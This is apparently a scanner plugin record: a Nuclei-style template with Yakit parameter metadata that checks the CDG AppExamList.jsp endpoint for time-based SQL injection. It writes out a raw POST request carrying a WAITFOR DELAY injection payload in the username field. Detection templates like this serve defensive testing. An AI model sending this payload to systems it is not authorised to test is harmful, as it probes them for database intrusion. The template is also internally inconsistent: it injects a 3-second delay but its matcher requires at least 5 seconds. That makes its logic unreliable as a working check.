content:
id: CDG-AppExamList-sqlInjection

info:
  name: CDG AppExamList SQL Injection
  author: iSee857
  severity: high
  description: |
    Detects SQL Injection vulnerability in CDG AppExamList endpoint by utilizing time-based payloads.

http:
  - method: POST
    raw:
      - |
        POST /CDGServer3/client/AppExamList.jsp;Servicelogin HTTP/1.1
        Host: {{Hostname}}
        Content-type: application/x-www-form-urlencoded

        username=1'WAITFOR+DELAY+'0:0:3'--
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"
      - type: status
        status:
          - 200
params: "[{\"Field\":\"target\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"扫描目标\",\"Help\":\"扫描目标可接受：主机名 / 主机名:端口 / IP段 / URL 等多种格式\",\"Required\":true},{\"Field\":\"reverse-url\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"反连 URL\",\"Help\":\"可使用 InteractshURL 也可使用 Yakit Reverse URL\"},{\"Field\":\"debug\",\"TypeVerbose\":\"boolean\",\"FieldVerbose\":\"设置调试模式\",\"Help\":\"开启调试模式，调试模式将输出尽量多的调试信息\"},{\"Field\":\"proxy\",\"TypeVerbose\":\"proxy\",\"FieldVerbose\":\"HTTP 代理\",\"Help\":\"设置 HTTP 代理\"}]"
help: Detects SQL Injection vulnerability in CDG AppExamList endpoint by utilizing time-based payloads.
author: iSee857
